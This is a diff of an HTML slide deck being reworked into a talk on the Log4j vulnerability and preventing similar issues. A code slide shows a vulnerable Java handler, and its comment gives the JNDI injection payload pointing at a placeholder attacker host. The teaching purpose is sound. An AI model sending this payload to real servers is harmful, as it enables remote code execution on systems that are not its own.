@@ -5,7 +5,7 @@
     <meta name="viewport"
           content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-    <title>Getting Started With OSS</title>
+    <title>Stopping Future Log4j Like Security Issues</title>
 
     <link rel="stylesheet" href="css/reveal.css">
     <link rel="stylesheet" href="css/theme/white.css">
@@ -65,37 +65,79 @@
 
         <!-- SLIDE 2 -->
         <section>
-            <h2>Before we get started, does anyone not know what an open source project is?</h2>
-            <p class="fragment"><a href="https://opensource.org/faq#osd">Definition: https://opensource.org/faq#osd</a></p>
+            <p>
+                <img src="images/sunshineLeft.jpeg" style="max-width: 600px;"/>
+            </p>
         </section>
 
         <!-- SLIDE 3 -->
         <section>
-            <h2>What is the <a href="http://commons.apache.org">Apache Commons Project</a>?</h2>
-            <ul>
-                <li class="fragment">Common location for sharing code for use across all Apache projects.</li>
-                <li class="fragment">Was jakarta commons (jakarta being the apache java project).
-                    <ul>
-                        <li class="fragment"><em>Note.</em> The Eclipse Foundation has recently (September 10, 2019)
-                        co-opted the name for their Java EE work. (We at Apache are supportive of this as well)</li>
-                    </ul>
-                </li>
-            </ul>
+            <p>
+                <img src="images/elCap.jpeg" style="max-width: 300px;"/>
+            </p>
         </section>
 
         <!-- SLIDE 4 -->
         <section>
-            <h2>What is the <a href="http://commons.apache.org">Apache Commons Project</a>?</h2>
+            <p>
+                <img src="images/canalDrop.jpeg" style="max-width: 600px;"/>
+            </p>
+        </section>
+
+        <!-- SLIDE 5 -->
+        <section>
+            <h2>Before we get started, does anyone not know what an open source project is?</h2>
+            <p class="fragment"><a href="https://opensource.org/faq#osd">Definition: https://opensource.org/faq#osd</a></p>
+        </section>
+
+
+
+        <!-- SLIDE 6 -->
+        <section>
+            <h2>The log4j exlpoit?</h2>
+            <pre class="fragment"><code class="java">public void handle(HttpExchange he) throws IOException {
+    String apiVersion = he.getRequestHeader("X-Api-Version");
+    // This line triggers the RCE by
+    // logging the attacker-controlled HTTP header.
+    // The attacker can set their X-Api-Version
+    // header to: ${jndi:ldap://some-attacker.com/a}
+    log.info("Requested Api Version:{}", apiVersion);
+    String response = "&lt;h1&gt;Hello from: "
+                + apiVersion + "!&lt;/h1&gt;";
+    he.sendResponseHeaders(200, response.length());
+    OutputStream os = he.getResponseBody();
+    os.write(response.getBytes());
+    os.close();
+  }
+</code></pre>
+        </section>
+
+        <!-- SLIDE 7 -->
+        <section>
+            <h2>What versions of Log4j are affected?</h2>
             <ul>
-                <li class="fragment"><strong>Current mission:</strong> Provide a place for other ASF projects to
-                    come together, collaborate and share
-                    common code.</li>
-                <li class="fragment">Committers from <em>any</em> Apache project can request commit privileges.</li>
+                <li class="fragment">Almost all versions of log4j version 2 are affected.</li>
+                <li class="fragment">2.0-beta9 <= Apache log4j <= 2.14.1</li>
             </ul>
-            <br/>
-            <br/>
-            <br/>
-            <br/>
+        </section>
+
+        <!-- SLIDE 8 -->
+        <section>
+            <h2>How bad is the "bleeding"?</h2>
+            <ul>
+                <li class="fragment">Luckily Sonatype has a dashboard here for us.</li>
+            </ul>
+            <p class="fragment">
+                <img src="images/sonatypeDash.png" style="max-width: 600px;"/>
+            </p>
+        </section>
+
+        <!-- SLIDE 9 -->
+        <section>
+            <h2>Here's the URL to the Dashboard</h2>
+            <p>
+                <a href="https://www.sonatype.com/resources/log4j-vulnerability-resource-center">https://www.sonatype.com/resources/log4j-vulnerability-resource-center</a>
+            </p>
         </section>
 
         <!-- SLIDE 5 -->
